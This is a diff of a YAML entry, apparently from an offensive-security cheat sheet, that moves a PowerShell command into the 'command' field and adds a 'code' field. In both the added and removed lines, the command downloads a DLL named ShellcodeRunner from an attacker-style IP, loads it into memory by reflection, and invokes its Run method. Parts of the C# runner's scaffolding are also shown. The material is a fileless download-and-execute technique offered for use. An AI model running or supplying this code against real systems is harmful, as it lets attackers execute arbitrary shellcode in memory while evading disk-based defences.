@@ -10,8 +10,20 @@ description: |
 
 
 command: |
+    $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.21/ShellcodeRunner.dll')
 
+    $assem = [System.Reflection.Assembly]::Load($data)
+    or (for local file)
+    $assem = [System.Reflection.Assembly]::LoadFile("C:\user\documents\ClassLibrary1.dll")
+
+    $class = $assem.GetType("ShellcodeRunner.Program")
+    $method = $class.GetMethod("Run")
+    $method.Invoke(0, $null)
+    Or
+    $a = [ShellcodeRunner.Program]::Run()
     ```
+
+code: |
     using System;
     using System.Runtime.InteropServices;
 
@@ -74,20 +86,7 @@ command: |
             }
         }
     }
-    ```
-    ```
-    $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.21/ShellcodeRunner.dll')
 
-    $assem = [System.Reflection.Assembly]::Load($data)
-    or (for local file)
-    $assem = [System.Reflection.Assembly]::LoadFile("C:\user\documents\ClassLibrary1.dll")
-
-    $class = $assem.GetType("ShellcodeRunner.Program")
-    $method = $class.GetMethod("Run")
-    $method.Invoke(0, $null)
-    Or
-    $a = [ShellcodeRunner.Program]::Run()
-    ```
 
 items:
     - Shell
